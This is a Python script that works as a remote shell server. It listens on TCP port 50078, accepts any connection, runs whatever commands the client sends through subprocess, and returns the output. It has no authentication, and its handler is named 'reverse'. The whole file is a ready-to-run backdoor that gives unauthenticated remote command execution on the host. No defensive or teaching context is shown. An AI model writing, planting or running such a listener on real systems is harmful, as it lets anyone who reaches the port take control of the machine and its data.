import os
import select
import socket
import threading
import subprocess

IP = socket.gethostbyname(socket.gethostname())
PORT = 50078
HEADER = 64

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((IP, PORT))

def execute(command, conn):
    splitted_command = command.split(" ")
    if splitted_command[0] == "cd":
        try:
            splitted_command[1]
        except:
            splitted_command.append("/home")
        print(splitted_command[1])
        if splitted_command[1].startswith("/"):
            try:
                os.chdir(f"{splitted_command[1]}")
                conn.send(bytes(" ", 'utf-8'))
            except Exception as e:
                conn.send(bytes(str(e), 'utf-8'))
            return

        else:
            try:
                os.chdir(f"{os.getcwd()}/{splitted_command[1]}")
                conn.send(bytes(" ", 'utf-8'))
            except Exception as e:
                conn.send(bytes(str(e), 'utf-8'))
            return
        print(os.getcwd())
    output = subprocess.getoutput(command)

    print(command.split(' '))
    if output == "":
        conn.send(bytes(" ", 'utf-8'))
    else:
        conn.send(bytes(output, 'utf-8'))

def reverse(conn, addr):
    command = ""
    connected = True
    executed = True
    print(f"[REVERSE] at {addr}")
    while connected:
        if select.select([conn], [], [], 0)[0]:
            executed = False
            data_chunk = conn.recv(HEADER)
            command += data_chunk.decode('utf-8')
        else: 
            if not executed:
                execute(command, conn)
                executed = True
                command = ""
    


def connect():
    running = True
    s.listen()
    while running:
        conn, addr = s.accept()
        threading.Thread(target=reverse, args=(conn, addr)).start()

connect()
